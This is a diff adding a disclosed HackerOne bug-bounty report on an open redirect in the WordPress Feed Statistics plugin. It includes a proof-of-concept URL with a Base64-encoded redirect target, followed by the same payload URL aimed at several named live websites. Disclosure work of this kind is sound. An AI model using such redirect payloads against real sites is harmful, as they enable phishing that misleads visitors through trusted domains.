@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/22142
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/mtk
+ReportedTo:Automattic(automattic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:07.08.2014 3:08:40
+
+Summary:
+
+Hi,
+    Feed Statistics Plugin is vulnerable to Open Redirect and effecting large amount of Websites. Which is the reason it should be patched swiftly. Detail description is given below:
+
+Tested on:
+Wordpress 3.9.1
+
+Vulnerable Plugin:
+Feed Statistics
+
+Plugin Link:
+http://wordpress.org/plugins/wordpress-feed-statistics/
+
+Tested on:
+Firefox 31.0 / Debian, Linux
+
+P.O.C:
+
+http://www.example.com/?feed-stats-url=any+website+in+Base64+Encoding+here
+Like this:
+http://www.example.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+Result Redirect to:
+http://www.sooevilsite.com/
+
+P.O.C P.O.C:
+
+http://hesp-news.org/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+https://www.dropboxatwork.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+https://starwars.gamona.de/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+https://joyinthisjourney.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+http://www.apaixonadosporseries.com.br/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+https://graziasl.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+
+Developer site :)
+http://www.chrisfinke.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+                Feel free to contact me anytime if there is more info required.
